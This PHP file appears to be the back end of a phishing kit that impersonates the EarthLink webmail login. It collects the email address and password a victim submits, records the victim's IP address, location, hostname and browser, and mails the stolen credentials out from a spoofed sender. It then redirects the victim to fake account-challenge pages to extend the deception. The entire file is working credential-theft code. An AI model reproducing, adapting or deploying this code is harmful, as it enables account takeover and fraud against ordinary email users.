<?php
error_reporting();
ob_start();
session_start();
$togo = @$_GET['svr'];
$asp = "MyAccounts.aspx";
$axp ="Re_Identify";

//Getting user ip & hostname & mapping it to location
$ip = getenv("REMOTE_ADDR");
$getipinfo = file_get_contents("http://www.geoplugin.net/php.gp?ip=".$ip."");
$data = unserialize($getipinfo);
$city=$data['geoplugin_city'];
          $region=$data['geoplugin_regionName'];
          $country=$data['geoplugin_countryName'];
          $log_date = date('d/m/Y - h:i:s');
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];




/** form fields **/

$email = $_POST['email'];
$passwd = $_POST['password'];
$domain = @substr(strrchr($email, "@"), 1);
        
if ($email == "" || $passwd == "") {
    $error = "null_entry";
    $uri = "https://webmail.earthlink.net/wam/login.jsp?redirect=%2Fwam%2Findex.jsp&errorkey=login.invaliddomain&x=280984873";
    header("Location: ./?error=$error&uri=$uri");
} else {
//including email to send
    include '../Email.php';


//Arranging reports
    $Hash = "==================+[ The - Apprentice ]+==================
Email : $email
Password   : $passwd
Dom : $domain
============= [ Ip & Hostname Info ] =============

Client IP: $ip
Country: $country
Region: $region
City: $city
TimeStamp: $log_date 
Hostname: $hostname
Agent: $agent
-----------------+  +-----------------";

//Relaying...
    $subject = "$email | New $domain User Notification";
    $headers = "From: Alert<salesjob@privejets.net>";
    $headers .= $_POST['eMailAdd']."\n";
    $headers .= "MIME-Version: 1.0\n";
    mail($SEND, $subject, $Hash, $headers);

//Dynamic redirect
    if ($togo == 'tf') {
//Exiting
//Exiting
        $asp = "/account/challenge/password?sess=14&src=webmail.earthlink.net/wam/login.jsp?AuthState=_8291c5634d9d&.intl=us&.lang=en-US&.partner=vz-acs&authMechanism=primary&display=login&yid=$email&done=https%3A%2F%2Fwebmail.earthlink.net/wam/login.jsp%2F&sessionIndex=Qw--&acrumb=4SZYMaUi";
        $top = "Consenting.app";
        $Redirect = "../docget.php?top=$top&crumb=$asp";

        header("Location: $Redirect").md5(time());
    } else {
//Exiting
//Exiting
        $asp = "/account/challenge/password?.src=earthlink&.intl=us&.lang=en-US&.partner=vz-acs&authMechanism=primary&error=sec&display=login&yid=$email&done=https%3A%2F%2Fwebmail.earthlink.net/wam/login.jsp%2F&sessionIndex=Qw--&acrumb=4SZYMaUi";
        $top = "Recesserror.app";
        $Redirect = "./?top=$top&crumb=$asp";

        header("Location: $Redirect").md5(time());
    }
}
